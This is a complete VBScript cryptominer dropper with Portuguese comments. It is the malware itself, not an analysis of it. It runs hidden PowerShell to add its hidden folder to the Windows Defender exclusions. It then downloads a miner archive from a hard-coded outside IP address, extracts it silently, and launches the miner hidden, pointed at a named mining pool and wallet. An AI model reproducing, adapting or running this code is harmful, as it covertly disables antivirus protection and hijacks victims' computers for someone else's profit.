' Objetos necessários
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
Set zipShell = CreateObject("Shell.Application")

' Pasta oculta
hiddenFolder = shell.ExpandEnvironmentStrings("%localappdata%") & "\temp_" & Right(Replace(fso.GetBaseName(WScript.ScriptFullName), ".vbs", ""), 4)

' Cria pasta se não existir
If Not fso.FolderExists(hiddenFolder) Then
    fso.CreateFolder(hiddenFolder)
End If

' --- TENTATIVA DE EXCLUSÃO NO DEFENDER ---
' Executa PowerShell silenciosamente para adicionar a pasta como exclusão
cmdExclusion = "powershell -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath '" & hiddenFolder & "'"""
shell.Run cmdExclusion, 0, True
' -----------------------------------------

' Caminhos dos arquivos
zipPath = hiddenFolder & "\miner.zip"
minerExeName = "sbrminer.exe"
minerPath = hiddenFolder & "\" & minerExeName

' Verifica se o minerador já foi extraído
If Not fso.FileExists(minerPath) Then
    url = "http://15.228.181.140:8585/miner.zip" 
    
    ' Configura requisição
    http.Open "GET", url, False
    http.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    http.Send

    ' Salva o ZIP
    If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.ResponseBody
        stream.SaveToFile zipPath, 2
        stream.Close
        Set stream = Nothing
        
        ' Extração automática silenciosa
        Set sourceZip = zipShell.NameSpace(zipPath)
        Set destFolder = zipShell.NameSpace(hiddenFolder)
        
        ' 4 = NoConfirmation, 16 = OverwriteFiles, 256 = NoProgressUI
        destFolder.CopyHere sourceZip.Items, 4 + 16 + 256
        
        ' Aguarda a extração terminar
        Do While destFolder.Items.Count < sourceZip.Items.Count
            WScript.Sleep 1000
        Loop
    End If
End If

' Aguarda 5 segundos para garantir estabilidade
WScript.Sleep 5000

' Executa o minerador (1 = Visível, 0 = Oculto)
shell.Run """" & minerPath & """ --algorithm yespowerr16 --pool stratum+tcp://pool.rhinominer.rocks:3333 --wallet RMuSGreUdbeN5ma6MSjVXdUsvirLL2zRck.caioalzap --password x --diff-factor 0.1", 0, False
